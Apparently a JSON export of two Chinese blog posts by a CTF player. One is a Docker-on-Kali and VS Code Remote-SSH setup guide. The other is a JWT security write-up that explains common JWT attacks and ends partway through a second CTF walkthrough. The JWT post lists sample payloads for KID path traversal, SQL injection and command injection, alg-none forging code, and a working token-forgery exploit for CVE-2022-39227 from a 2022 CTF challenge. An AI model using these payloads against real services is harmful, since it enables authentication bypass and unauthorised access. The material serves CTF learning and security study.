[{"title":"Build-Your-Remote-Linux-Docker","url":"/2022/11/29/Build-Your-Remote-Linux-Docker/","content":"\nAuthor ：探姬\n\n本文也有配套视频，建议结合食用：(给个三连吧www)https://www.bilibili.com/video/BV1684y1z7L6\nAbout本文档完整的流程可以帮助您在 Kali Linux上完成Docker环境，并且基于Vscode的Remote功能，利用SSH协议，构建 VSCODE + SSH + Docker 的工作流，提高效率。同样，本文档也考虑了非Kali，用于开发&#x2F;生产环境的 Ubuntu &#x2F; Debian 系统 ，如果您想要在开发&#x2F;生产中使用该工作流，可以直接从 Get Docker或者 Build SSH＋vscode + docker Workflow章节开始。笔者水平有限，错误疏漏之处在所难免，烦请各位师傅斧正。以及非常感谢 **陈橘墨(@*Randark_JMT*)师傅**提供的帮助。\nGet KaliDownload在Kali官网下载即可，建议直接下载封装好的虚拟机版本：解压下载好的压缩包到您想要放置虚拟机的位置，然后双击配置文件直接打开自动添加，或者在VMware中手动添加：添加完成后，启动即可：（当然，作为DockerRuner，您可能需要设置一个稍微大点的内存值）\nChangeResource？笔者并不建议换源，Kali官方源的速度还是不错的，换源可能会导致您软件管理出现问题。\nGet DockerInstalldocker安装目前有两个版本，一个是官方的docker.ce版本，一个是有Debian团队维护的**docker.io**版本。之前有争议说 docker.io 是旧版本的docker 而新版的docker是 dockers.ce然而docker.io的版本有时会比docker.ce高，事实上，两者只是负责维护的组织不同，前者是Debian官方维护，后者则为Docker官方维护，并没后新旧之分：\ndocker.io该版本由Debian团队维护，采用 apt 的方式管理依赖安装过程：\nsudo apt-get update\n\n\nsudo apt install docker.io\n\n\ndocker.ce由docker官方维护的版本，采用 go 的方式管理依赖，如果您要在开发&#x2F;生产环境中使用docker，推荐使用该版本。如果您的Linux版本为Ubuntu&#x2F;Debian，可以使用一下命令自动安装：\nwget -qO- https://get.docker.com/ | sh\n\n（注意，Docker并不支持Kali一键安装，同样笔者也不推荐您用kali作为开发生产环境，Kali满足日常需要，使用io版本即可，当然您也可以使用.ce版本的手动安装）手动安装：可以参考Docker官方的 Docker Engine安装步骤：但是该步骤在 Kali Linux上面可能会存在一定问题，以Kali为例，完整的按照流程如下：\nsudo apt-get updatesudo apt-get install \\    ca-certificates \\    curl \\    gnupg \\    lsb-release\n\n选项选择Yes就好。然后按照官网提示，添加Docker官方的 GPG key：\nsudo mkdir -p /etc/apt/keyringscurl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n\n然后设置仓库：\necho \\  &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\  $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\n\n然后开始安装：\nsudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n随后，如果您是Kali Linux，您可能会遭遇以下报错：\n这是由于Docker官方并没有提供直接支持Kali的源，所以我们使用Debian的源就好：\nprintf &quot;%s\\n&quot; &quot;deb [arch=amd64] https://download.docker.com/linux/debian buster stable&quot; |\\sudo tee /etc/apt/sources.list.d/docker-ce.list\n\n并且添加对应的密钥：\ncurl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -\n\n注意不要忘了给密钥相应权限：\nsudo chmod a+r /etc/apt/keyrings/docker.gpg\n\n此时再跑一次 sudo apt-get update:\nsudo apt-get update\n\n您可能会遇到一个找不到的源，这个是正常的。接下来安装docker：\nsudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n就能正常获取了：安装完成后，执行hello-world，得到图示则安装成功。\nsudo docker run hello-world\n\n\nDockerHub尝试登录您的DockerHub账号：如果出现类似错误，请手动配置DNS：\nsudo vim /etc/resolv.conf\n\n保存，再次尝试即可成功登录：\nBuild SSH＋vscode + docker Workflow该步骤适用于支持SSH协议的Linux（废话，哪个Linux没有个SSH），除了在本地的Kali或者其他Linux上面构建，也支持远程构建该工作流。\nStart SSH ServiceKali LinuxKali虚拟机默认是没有开启ssh服务的 （ssh状态：/etc/init.d/ssh status）所以需要手动启动一下：\nsudo /etc/init.d/ssh start \n\n当然，为了方便，我们将ssh添加到开机自启中：\nsudo update-rc.d ssh enable# Or use:systemctl enable ssh.service\n\n启动之后就可以开始后面的步骤了。\nUbuntu由于ubuntu默认不自带openssh-server，所以这里需要手动安装。安装openssh-server：\nsudo apt-get install openssh-server\n\n安装完成后启动服务：\nsudo service ssh start\n\nGet Remote - SSH为了使用vscode的远程ssh功能 您可能需要在扩展中安装Remote - SSH插件：\nLet Vscode Connect to host连接方式有两种：密码连接 和 ssh的公私钥。一般情况下我们使用密码连接，这样的方法安全性较低，而且每次连接和每次切换目录的时候都会要求输入密码，所以在确保能够密码连接情况下，我们可以进一步使用公私钥验证的方式来提升安全性和优化操作友好性。\nUsing password connection打开vscode，点击左下角的远程连接（绿色的部分）接着在弹出的窗口中选择 Connect to Host选择 Add New SSH Host：按照要求输入对应的指令：IP可通过 ip a 获取ssh kali@192.168.28.145 -A保存位置默认第一个就好：然后连接：选择对应的系统：选择继续：输入密码：初始化完成后就连接上了：\nUsing public and private keysCreate public and private keys首先在本机上生成对应的公钥私钥：\nssh-keygen\n\n\nEnter file in which to save the key (C:\\Users\\Probius/.ssh/id_rsa):\n\n输入保存路径，如果为空默认为 C:\\Users\\USERNAME/.ssh/id_rsa，这里笔者直接输入了名字，让其以该名字直接保存在当前目录\nEnter passphrase (empty for no passphrase):\n\n输入私钥密码，为空则没有\nEnter same passphrase again:\n\n注意：如果您使用了私钥密码，那么在进行ssh登录的时候，会提示您输入私钥密码，相当于再使用公私钥登录的情况下又加了一层密码，安全性有很大的提升，但是这样会变得和密码登录一样每次都要输入，这里笔者建议，如果是本地一路回车就好了，如果是远程资源的管理，可以综合安全性考虑生成过后，得到的id_rsa.pub(Kali_test.pub)是公钥，id_rsa(Kali_test)是**私钥 **将得到的私钥放在我们的.ssh(C:\\Users\\USERNAME.ssh)中。(您也可以在生成的时候就让他防止在此，当然这并不是重点）\nConfiguring Remote Host将得到的公钥上传到 Kali&#x2F;服务器中对应用户的.ssh文件夹中(请确保该文件夹至少有700的权限)：（注意 kali默认没有该文件夹，需要用户手动创建，并且赋700权限 mkdir ~/.ssh ）在此处打开终端，用公钥文件来生成 authorized_keys：\ncat id_ras.pub &gt;&gt; authorized_keys# 此处既 cat Kali_test.pub &gt;&gt; authorized_keys\n\n由于Linux系统对.ssh拥有比较严格的权限限制，请确保权限配置正确：\nsudo chmod 600 authorized_keyssudo chmod 700 ~/.ssh\n\n编辑ssh配置文件\nsudo vim /etc/ssh/sshd_config\n\n确保拥有以下条目：\nRSAAuthentication yesPubkeyAuthentication yes\n\n注意Kali的ssh默认配置是没有上诉两项的，需要自行添加：然后搞定一切后 重启SSH服务：\nsudo service ssh restart\n\nLinux部分的配置这样就搞定啦~（在您确保您的连接无误后，如果是服务器等远程设备，可以在config中关闭密码登录以提升安全性：PasswordAuthentication no）\nConfiguring Local Host然后是Windows，也就是vscode这边的配置：添加NewHost：使用：\nssh USERNAME@IP -i C:\\\\Users\\\\Probius\\\\.ssh\\\\RAS_ID\n\n（注意使用指令添加时，务必使用双斜杠）当然，也可以在已经添加的配置文件上改：\nHost 192.168.28.145\tHostName 192.168.28.145\tUser kali\tIdentityFile C:\\Users\\Probius\\.ssh\\Kali_test\n\n如果操作无误，且没有设置私钥密码，那么点击连接之后无需其他额外操作即可连接；如果设置了私钥密码，那么按照提示输入即可。\nOther_About SSH key login关于ssh密钥登录的更多知识可以看这一篇文章：\nGet The Docker ExtensionInstall extension（当然 如果显示的是 安装也是一样的）\nSolve error如果您使用自动安装，应该不会遇到该问题，自动安装的sh会自动完成用户组添加的操作。由于权限原因，我们可能无法访问到 /var/run/docker.sock\nBy add user group一劳永逸的解决权限问题，将当前用户组添加到docker组即可。创建docker用户组，默认安装时就会自动创建，所以执行可能会显示exist\nsudo groupadd docker \n\n添加当前用户到该组：\nsudo usermod -aG docker $&#123;USER&#125; \n\n然后重新启动容器服务：\nsudo systemctl restart docker \n\n再次重新登入即可，如果重新登录之后依旧报错无法读取，请尝试重启：\nreboot\n\nBy chmod也可以使用sudo chmod 777 /var/run/docker.sock，但是每次重启之后权限都会重置，不推荐然后就能正常访问了：\nStart Use（以下操作使用DockerHub演示）因为在安装Docker的时候登录过DockerHub所以这里连接之后，系统会自动获取您的凭证，您可以在这查看您的DockerHub仓库：当然，您也可以添加其他仓库，具体的用法可以参考官方文档：\nPull Image当然 对于自己仓库的镜像还是比较方便的233：当然如果是公开镜像的话 还是免不了指令啦，不过还是比较方便的，旁边就是终端：完成之后就能在IMAGES栏看到了：\nRun Docker运行容器有两个选项Run &#x2F; Run Ineractive\nRun默认后台运行，Run执行后效果和在Linux执行 -d的效果相同：\nRun Interacitve该选项运行执行后，除了运行容器，还会跳到容器的汇总shell处，这里会实时打印容器日志，效果和 View Log效果相同：\nView Log直达容器后台日志，如果在运行的时候选择Run Interacitve那么也会跳转到该log页面。\nAttach Shell右键选中之后可以直接建立一个容器内部的shell，省去docker exec -i -t ID /bin/bash\nEdit Container在CONTAINERS中下拉一个容器的file可以对其进行查看和编辑：可以看到对于容器来说 修改是即时的（支持热更新的）\nAttach Container（Advanced Edit？）我们也可以用Vscode建立类似SSH的连接，直接连接到整个容器：并且操作同步：而且容器支持文件拖拽，相比单纯的COPY指令 拥有更好的体验（个人感觉\nPort Forward通过SSH直接将远程端口转发到本地，免除防火墙困扰ww一般来讲在您启动容器的时候 vscode会自动配置 当然为了更好的区分和避免冲突 也可以手动分配配置如图：\nOpen in Borrow如果您配置完成了端口转发(或者vscode自动为您完成配置）那么点击Open in Borrow将在您的默认浏览器中快速打开该端口对应的页面：\nOther其他用法，就请佬们自行探索啦ww\nExtensionRecommendThunder ClientThunder Client is a lightweight Rest API Client Extension for Visual Studio Code, hand-crafted by Ranga Vadhineni with simple and clean design.要注意的是 该插件基于远程运行（既本体在虚拟机&#x2F;服务器上），在测试的时候请确保url指向正确。\n","categories":["CTF","Develop"],"tags":["Docker"]},{"title":"From Jwt To The XiangYunCup FunWeb","url":"/2022/11/20/From-Jwt-To-The-XiangYunCup-FunWeb/","content":"About JWTWhat is JWTJson Web Token(JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。此信息可以验证和信任，因为它足数字签名的。JWT可以使用密钥(使用 HMAC算法)或便用RSA或 ECDSA 的公钥&#x2F;私钥对进行签名。\n\n注意：本文的重心并不在介绍JWT上，所以在官方文本的基础上会有一些删减。\n如需了解更多，可以访问起官方网站，翻阅对应的文献资料：\nhttps://jwt.io/introduction\nhttps://jwt.io/\n\nJWT formatJWT的格式大致如下：\nHeader.Payload.Signature\n\n\n对于任意JWT令牌，我们可以在jwt.io官网或者其他jwt解码工具查看详细：\n\nHeaderJWT头是一个描述JWT元数据的JSON对象，alg属性表示签名使用的算法，默认为HMAC SHA256（写为HS256）；typ属性表示令牌的类型，JWT令牌统一写为JWT。\n最后，使用Base64 URL算法将上述JSON对象转换为字符串保存\n&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;\n\nPayload有效载荷部分，是JWT的主体内容部分，也是一个JSON对象，包含需要传递的数据。 \nJWT指定七个默认字段供选择：\niss：发行人nbf：在此之前不可用(时间戳)iat：发布时间(时间戳)exp：到期时间(时间戳)sub：主题aud：用户jti：JWT ID用于标识该JWT\n\n这些预定义的字段并不要求强制使用。\n除以上默认字段外，我们还可以自定义私有字段，一般会把包含用户信息的数据放到payload中，如下例：\n&#123;  &quot;exp&quot;: 1667141915,  &quot;iat&quot;: 1667141615,  &quot;is_admin&quot;: 0,  &quot;is_login&quot;: 1,  &quot;jti&quot;: &quot;5vpXRcirMlzlMPnx0sSX7w&quot;,  &quot;nbf&quot;: 1667141615,  &quot;password&quot;: &quot;f61d&quot;,  &quot;username&quot;: &quot;f61d&quot;&#125;#################################################################[+] exp = 1667141915    ==&gt; TIMESTAMP = 2022-10-30 22:58:35 (UTC)[+] iat = 1667141615    ==&gt; TIMESTAMP = 2022-10-30 22:53:35 (UTC)[+] is_admin = 0[+] is_login = 1[+] jti = &quot;5vpXRcirMlzlMPnx0sSX7w&quot;[+] nbf = 1667141615    ==&gt; TIMESTAMP = 2022-10-30 22:53:35 (UTC)[+] password = &quot;f61d&quot;[+] username = &quot;f61d&quot;\n\nSignature签名哈希部分是对上面两部分数据签名，需要使用base64编码后的header和payload数据，通过指定的算法生成哈希,公式如下：\nHMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)\n\n注意的是，如果header部分中，参数alg置空，则无该部分(我们也称其为Nonsecure JWT)。\nAll IN在计算出签名哈希后，JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用.分隔，就构成整个JWT对象\n注意JWT每部分的作用，在服务端接收到客户端发送过来的JWT token之后：\n\nheader和payload可以直接利用base64解码出原文，从header中获取哈希签名的算法，从payload中获取有效数据\nsignature由于使用了不可逆的加密算法，无法解码出原文，它的作用是校验token有没有被篡改。服务端获取header中的加密算法之后，利用该算法加上secretKey对header、payload进行加密，比对加密后的数据和客户端发送过来的是否一致。注意secretKey只能保存在服务端，而且对于不同的加密算法其含义有所不同，一般对于MD5类型的摘要加密算法，secretKey实际上代表的是盐值\n\nJWT ClassificationNonsecure JWTheader部分中，参数alg置空的JWT。\nJWSJWS ，也就是JWT Signature，其结构就是在之前nonsecure JWT的基础上，在头部声明签名算法，并在最后添加上签名。\n创建签名，是保证jwt不能被他人随意篡改。\n我们通常使用的JWT一般都是JWS\n为了完成签名，除了用到header信息和payload信息外，还需要算法的密钥，也就是secretKey。\n加密的算法一般有两类：\n\n对称加密：secretKey指加密密钥，可以生成签名与验签\n非对称加密：secretKey指私钥，只用来生成签名，不能用来验签(验签用的是公钥)\n\nJWT的密钥或者密钥对，一般统一称为JSON Web Key，也就是JWK\n如需了解JWT的签名算法可以前往其官网查阅：\nhttps://jwt.io/libraries\nUse如果您想知道如何将JWT用于开发中，请移步另一篇文章：(写作中……)\nVerificationJWT的后端验证是比较多样的，大概的流程可以参考下图：\n\n这也是说JWT的后端验证多样的原因，如何利用JWT的信息和signature综合的去验证JWT的有效性，在开发者选择使用JWT的适合就要做好相应的准备——生成和验证是一体的。\nCommon Security risk of JWT在简单了解了JWT之后，我们来看看JWT常见的一些安全风险：\n敏感信息泄露如果不当的使用Header和Payload部分，在其中存储一些敏感信息，可能会产生一定安全风险，因为两者只经过简单的base64编码。\n当然这种在实际环境中很少见，但是却能成为个别CTF比赛的web签到题的考点（\n签名算法替换如果应用不限制 JWT中使用的算法类型，导致算法类型可控，这样会带给JWT巨大的安全风险。\n签名算法置空（CVE-2015-2951）我们知道在JWT的头部中声明了token的类型和签名用的算法：\n&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;\n\n上header指定了签名算法为HS256，意味着服务端利用此算法将header和payload进行加密，形成signature，同时接收到token时，也会利用此算法对signature进行签名验证。\n如果后端程序信任来源的JWT头部，那么当我们改变器头部算法，将其置空设置为\nNone\n\n那么服务端接收到token后会将其认定为无加密算法， 于是对signature的检验也就失效了，那么我们就可以随意修改payload部分伪造token。\n当然这一切的前提是，后端信任前端。\n比如2022年首届数据安全题目中的一道web题，我们就可以通过该方法伪造token。\n# 可以通过令algorithm为空，绕过对签名和密钥的检验import jwtpayload = &#123;&#x27;username&#x27;: &#x27;admin&#x27;&#125;token = jwt.encode(payload=payload,algorithm=None,key=None)print(token)&#x27;&#x27;&#x27;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.&#x27;&#x27;&#x27;\n\n\n非对称密码算法修改为对称算法(密钥混淆CVE-2016-10555)HMAC和RSA是JWT比较常见的两种算法。\nHMAC：token使用密钥签名，然后使用相同的密钥进行验证。（对称）\nRSA    ：token将首先使用私钥创建，然后使用相应的公钥进行验证。（非对称）\n对于两者，密钥和私钥都要保密，因为签名和校验依赖它们。\n这里假设一个网站使用RSA生成和验证token，那么这里会有两个变量参与：私钥Prit和公钥Pub。\n如果签名算法可控，我们将算法头改为HMAC，使用RSA的公钥Pub来生成一个token，那么我们将构造好的JWT发送回去时，后端验证查询则会用RSA的公钥Pub以HMAC的算法验证方式来验证token。\n当然如果该漏洞存在，那么对于使用非对称加密的token，我们都可以尝试这样的方法，比如RS256变成HS256，比如这一道CTF题目：\nhttps://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/\n签名未校验&#x2F; 无效签名某些服务端并未校验JWT签名，可以尝试修改signature后(或者直接删除signature)，亦或者直接修改payload。\n找到一个只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。\n比如：\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicHJvYml1cyIsImFjdGlvbiI6InByb2ZpbGUifQ.5GVEWIw7-IdM9fQMt6H5Wxpmp1HpnyQb33CsXnZ9qKM\n\n\n如果我们直接修改payload段，使用修改后的token重放，如访问页面正常，则说明漏洞存在。\n伪造密钥(CVE-2018-0114)jwk是header里的一个参数，用于指出密钥，存在被伪造的风险。\n比如CVE-2018-0114： \nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114\n攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。\n比如：\n&#123;  &quot;typ&quot;: &quot;JWT&quot;,  &quot;alg&quot;: &quot;RS256&quot;,  &quot;jwk&quot;: &#123;    &quot;kty&quot;: &quot;RSA&quot;,    &quot;kid&quot;: &quot;TEST&quot;,    &quot;use&quot;: &quot;sig&quot;,    &quot;e&quot;: &quot;AQAB&quot;,    &quot;n&quot;: &quot;oUGnPChFQAN1xdA1_f_FWZdFAis64o5hdVyFm4vVFBzTIEdYmZZ3hJHsWi5b_m_tjsgjhCZZnPOLn-ZVYs7pce__rDsRw9gfKGCVzvGYvPY1hkIENNeBfSaQlBhOhaRxA85rBkg8BX7zfMRQJ0fMG3EAZhYbr3LDtygwSXi66CCk4zfFNQfOQEF-Tgv1kgdTFJW-r3AKSQayER8kF3xfMuI7-VkKz-yyLDZgITyW2VWmjsvdQTvQflapS1_k9IeTjzxuKCMvAl8v_TFj2bnU5bDJBEhqisdb2BRHMgzzEBX43jc-IHZGSHY2KA39Tr42DVv7gS--2tyh8JluonjpdQ&quot;  &#125;&#125;\n\n签名密钥爆破按照JWT的结构，我们是可以得知其使用的签名算法的，如果可以爆破出对应的密钥，我们就能随意的”伪造”token了。\n这里以HMAC签名举例：\nHMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。因此，HMAC JWT破解是离线的，通过JWT破解工具，可以快速检查已知的泄漏密码列表或默认密码。\n工具会在下边介绍。\n泄露密钥这个一般得打组合拳，配合如目录遍历、XXE、SSRF等可以读取存储密钥值文件漏洞，这样就可以窃取密钥并签署任意token。\nKID操控KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。KID参数的正确用法如下所示：\n&#123;    &quot;alg&quot;: &quot;HS256&quot;,    &quot;typ&quot;: &quot;JWT&quot;,    &quot;kid&quot;: &quot;1&quot;        //使用密钥1验证token&#125;\n\n由于此字段是由用户控制的，因此可能会被恶意操纵并导致危险的后果。\n目录遍历由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。\n&quot;kid&quot;: &quot;../../public/css/main.css&quot;   //使用公共文件main.css验证token\n\n这样我们就可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。\nSQL注入KID也可以用于在数据库中检索密钥。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。\n&quot;kid&quot;:&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;  //Use a string &quot;key&quot; Authentication token\n\n上面这个注入会导致应用程序返回字符串“ key”,\n因为数据库中不存在名为”aaaaaaa”的密钥，然后使用字符串“ key”作为密钥来认证token。\n命令注入有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。一些函数就能给此类型攻击可乘之机，比如Ruby open（）。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：\n&quot;key_file&quot; | whoami;\n\n类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似system()，exec()的函数时，都会产生此种漏洞。\n其他头部参数操控除KID外，JWT标准还能让开发人员通过URL指定密钥。\nJKU头部参数JKU全称是“JWKSet URL”，它是头部的一个可选字段，用于指定链接到一组加密token密钥的URL。若允许使用该字段且不设置限定条件，攻击者就能托管自己的密钥文件，并指定应用程序，用它来认证token。\njku URL-&gt;包含JWK集的文件-&gt;用于验证令牌的JWK\n\n操纵X5U，X5C URL同JKU或JWK头部类似，x5u和x5c头部参数允许攻击者用于验证Token的公钥证书或证书链。x5u以URI形式指定信息，而x5c允许将证书值嵌入token中。\nJWTtool如果您需要对您使用JWT的网站进行安全测试，这里也有对应的工具，比如JWTtool，上述常见的JWT漏洞都可以使用该工具进行利用：\nhttps://github.com/ticarpi/jwt_tool\n同时你也能在该项目的Wiki网站上获取更多jwt的知识：\nhttps://github.com/ticarpi/jwt_tool/wiki\n2022 XiangyunCup FunWeb我们来看看2022年祥云杯的Web题——FunWeb。\n这道题并没有考察传统的JWT漏洞 而是选择一个比较新的 1day (CVE-2022-39227 )来出题。\n经典的开局一个登录框，登录页面抓包后先跑了admin的弱口令，当然现在的题一般没这么容易，并没有结果。\n老老实实注册进去，有两个可以点的，一个是查看flag，一个是查看成绩，点击之后发现都需要admin身份，所以抓包分析看到了一下，发现xxx.yyy.zzz的token结构，下意识就去jwt.io解码了：\n\n从payload可以判断大概这里就是突破点。\n当然面对这样一道JWT的题目，常规攻击手段肯定是首选，不过这样的题目，如果常规打不下来，就得考虑在github上面找commit了。\n所以在一天常规攻击无果后，于是开始找最近有关jwt的day，然后队里另外一位师傅翻到了python jwt的1day，也就是CVE-2022-39227\nhttps://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9\n拉到最后我们可以看到作者在test中提供了漏洞POC：\n&quot;&quot;&quot; Test claim forgery vulnerability fix &quot;&quot;&quot;from datetime import timedeltafrom json import loads, dumpsfrom test.common import generated_keysfrom test import python_jwt as jwtfrom pyvows import Vows, expectfrom jwcrypto.common import base64url_decode, base64url_encode@Vows.batchclass ForgedClaims(Vows.Context):    &quot;&quot;&quot; Check we get an error when payload is forged using mix of compact and JSON formats &quot;&quot;&quot;    def topic(self):        &quot;&quot;&quot; Generate token &quot;&quot;&quot;        payload = &#123;&#x27;sub&#x27;: &#x27;alice&#x27;&#125;        return jwt.generate_jwt(payload, generated_keys[&#x27;PS256&#x27;], &#x27;PS256&#x27;, timedelta(minutes=60))    class PolyglotToken(Vows.Context):        &quot;&quot;&quot; Make a forged token &quot;&quot;&quot;        def topic(self, topic):            &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;            [header, payload, signature] = topic.split(&#x27;.&#x27;)            parsed_payload = loads(base64url_decode(payload))            parsed_payload[&#x27;sub&#x27;] = &#x27;bob&#x27;            parsed_payload[&#x27;exp&#x27;] = 2000000000            fake_payload = base64url_encode((dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))            return &#x27;&#123;&quot;  &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;        class Verify(Vows.Context):            &quot;&quot;&quot; Check the forged token fails to verify &quot;&quot;&quot;            @Vows.capture_error            def topic(self, topic):                &quot;&quot;&quot; Verify the forged token &quot;&quot;&quot;                return jwt.verify_jwt(topic, generated_keys[&#x27;PS256&#x27;], [&#x27;PS256&#x27;])            def token_should_not_verify(self, r):                &quot;&quot;&quot; Check the token doesn&#x27;t verify due to mixed format being detected &quot;&quot;&quot;                expect(r).to_be_an_error()                expect(str(r)).to_equal(&#x27;invalid JWT format&#x27;)\n\n注意这一点注释：&quot;Use mix of JSON and compact format to insert forged claims including long expiration&quot;可以得知，这个漏洞的本质就是利用 json格式的注⼊  \n如果稍加改造，我们就可以获得一个EXP：\nfrom datetime import timedeltafrom json import loads, dumpsfrom common import generated_keysimport python_jwt as jwtfrom pyvows import Vows, expectfrom jwcrypto.common import base64url_decode, base64url_encodedef topic(topic):    &quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;    [header, payload, signature] = topic.split(&#x27;.&#x27;)    parsed_payload = loads(base64url_decode(payload))    parsed_payload[&#x27;is_admin&#x27;] = 1    parsed_payload[&#x27;exp&#x27;] = 2000000000    fake_payload = base64url_encode(        (dumps(parsed_payload, separators=(&#x27;,&#x27;, &#x27;:&#x27;))))    # print (header+ &#x27;.&#x27; +fake_payload+ &#x27;.&#x27; +signature)    # print (header+ &#x27;.&#x27; + payload+ &#x27;.&#x27; +signature)    return &#x27;&#123;&quot;  &#x27; + header + &#x27;.&#x27; + fake_payload + &#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27; + header + &#x27;&quot;, &quot;payload&quot;:&quot;&#x27; + payload + &#x27;&quot;,&quot;signature&quot;:&quot;&#x27; + signature + &#x27;&quot;&#125;&#x27;originaltoken = &#x27;&#x27;&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxNDE5MTUsImlhdCI6MTY2NzE0MTYxNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiI1dnBYUmNpck1semxNUG54MHNTWDd3IiwibmJmIjoxNjY3MTQxNjE1LCJwYXNzd29yZCI6ImY2MWQiLCJ1c2VybmFtZSI6ImY2MWQifQ.cqQ2RVegORBfB_fo33birEJs8Tw8WDM7wIYwfXz_BpW6gQG99cl-DePmP6iNx5Mf0aCwDcuqS-wOXjis7JVmhpf8dmdYkP_gLvYMULpPcFX03j70Cu3bhMWSAGUMjt_IFGQ1-xfwYp1LI9SWAlBM5wDPCh-gi96abRDvhRW-c-6mFul2us_XKl7kyceT2fY2ABrcJRSKA91kLm3ZOcD4FA6yuHMyKVfmN9RqPtzvvUVutniv03XPFTGIzHudzswRc0b3nN-XMsnyi_Ca62T8CVb1MMEDPVlDM7CDJmJXGfoNimkrOhPi22SItpv4tO7u-bbene3PpvW1Lv7UEQeDBg&#x27;&#x27;&#x27;topic = topic(originaltoken)print(topic)\n\n利用生成的json当作token传参即可绕过：\n\nJWT的部分其实到这就结束了，后面如何拿flag就涉及到grahql的一个注入了，如果有时间，我会在下一篇文章总结一些SQL注入的知识。\nFrom FunWeb to CVE-2022-39227 vulnerability analysis本来还想着要分析，最近时间不是很够，敲好J1an师傅直接把文档炫我嘴里了（，\n\n\n那这里原理分析我就直接使用J1an师傅的文章啦：\n原文地址：https://forum.butian.net/share/1990 过审了所以添上了ww\n奇安信攻防社区-CVE-2022-39227漏洞分析.pdf\nOther Jwt topics[HFCTF2020]EasyLogin该WriteUp来源：https://www.jianshu.com/p/0f76e1c69e33\n复现环境：[https://buuoj.cn/challenges#[HFCTF2020\\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)https://www.ctfhub.com/#/challenge\n题解运行环境发现是一个登录页面，直接登录显示Cannot read property &#39;split&#39; of undefined，需要先注册再登陆。使用注册的普通账号登录，发现get flag按钮，点击提示permission denied，无权限，那么此题的方向应该是伪造成一个高权限账户。截取登录包，发现两处可疑authorization校验字段，Cookie也存在sses.aok的校验\n\n可以看到xxx.yyy.zzz的结构，解码可知为jwt\n\n通过查看源码，发现&#x2F;static&#x2F;js&#x2F;app.js 页面存在提示\n/** *  或许该用 koa-static 来处理静态文件 *  路径该怎么配置？不管了先填个根目录XD */\n\nkoa-static 错误配置的源码泄露\n说明 app.js 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码\n继续分析根目录的app.js，发现代码引用了两个当前目录的文件\nconst rest = require(&#x27;./rest&#x27;);const controller = require(&#x27;./controller&#x27;);\n\n说明存在rest.js和controller.js文件\n访问rest.js发现同样一个路径前缀 api\nconst pathPrefix = &#x27;/api/&#x27;;\n\n访问controller.js看到下面的代码\n遍历在controllers文件夹下的以.js结尾的文件，并且引入文件添加在router中，推断controllers文件夹下存在一个api.js文件\nfunction addControllers(router, dir) &#123;    fs.readdirSync(__dirname + &#x27;/&#x27; + dir).filter(f =&gt; &#123;        return f.endsWith(&#x27;.js&#x27;);    &#125;).forEach(f =&gt; &#123;        const mapping = require(__dirname + &#x27;/&#x27; + dir + &#x27;/&#x27; + f);        addMapping(router, mapping);    &#125;);&#125;module.exports = (dir) =&gt; &#123;    const controllers_dir = dir || &#x27;controllers&#x27;;    const router = require(&#x27;koa-router&#x27;)();    addControllers(router, controllers_dir);    return 